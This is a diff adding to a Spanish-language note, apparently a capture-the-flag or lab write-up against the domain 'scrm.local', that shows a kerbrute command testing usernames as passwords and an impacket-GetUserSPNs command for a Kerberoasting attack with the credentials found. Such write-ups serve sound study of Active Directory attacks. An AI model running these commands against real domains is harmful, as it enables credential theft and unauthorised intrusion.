@@ -78,4 +78,17 @@ En este caso no obtendremos los TGT de los usuarios
 
 
 ### User as Password
-Probamos 
+Probamos a usar el nombre de usuario como contraseña usando la herramienta de [[KERBRUTE]]
+```shell
+kerbrute bruteuser --dc 10.129.8.117 -d scrm.local users ksimpson
+```
+
+En este caso vemos que el usuario `ksimpson` utiliza su nombre como contraseña
+
+Una vez con estas credenciales validas probaremos un `KERBEROASTING Attack`
+
+#### KERBEROASTING Attack
+Usaremos la herramienta de  [[IMPACKET]]
+```shell
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson
+```
